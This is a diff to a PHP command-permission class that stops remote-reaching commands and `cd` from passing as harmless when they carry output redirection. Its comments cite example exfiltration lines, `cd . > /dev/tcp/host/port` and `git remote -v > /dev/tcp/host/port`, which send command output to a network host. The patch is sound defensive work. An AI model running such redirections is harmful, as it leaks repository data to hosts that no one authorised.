@@ -63,7 +63,7 @@ final readonly class CommandPolicy
             }
             $reachesARemote = $this->reachesARemote($command->programWords());
             $needsSshAgent = $needsSshAgent || $reachesARemote;
-            $hasOtherParts = $hasOtherParts || (!$reachesARemote && !$this->isPlainCd($command));
+            $hasOtherParts = $hasOtherParts || !$this->isRemoteOrCd($command, $reachesARemote);
             $isDownloadPiped = $isDownloadPiped || \in_array(basename($command->programWords()[0] ?? ''), self::DOWNLOADERS, true);
         }
 
@@ -76,11 +76,14 @@ final readonly class CommandPolicy
     }
 
     /**
-     * A `cd` with no redirection, as the grants read one: `cd . > /dev/tcp/host/port` is no plain `cd`.
+     * A remote or a `cd`, with no redirection: grants read words only, and `git remote -v > /dev/tcp/host/port` would
+     * send the remotes, on the open network, where no grant vouched for.
      */
-    private function isPlainCd(SimpleCommand $command): bool
+    private function isRemoteOrCd(SimpleCommand $command, bool $reachesARemote): bool
     {
-        return 'cd' === ($command->programWords()[0] ?? null) && [] === $command->redirections;
+        $isCd = 'cd' === ($command->programWords()[0] ?? null);
+
+        return ($reachesARemote || $isCd) && [] === $command->redirections;
     }
 
     /**
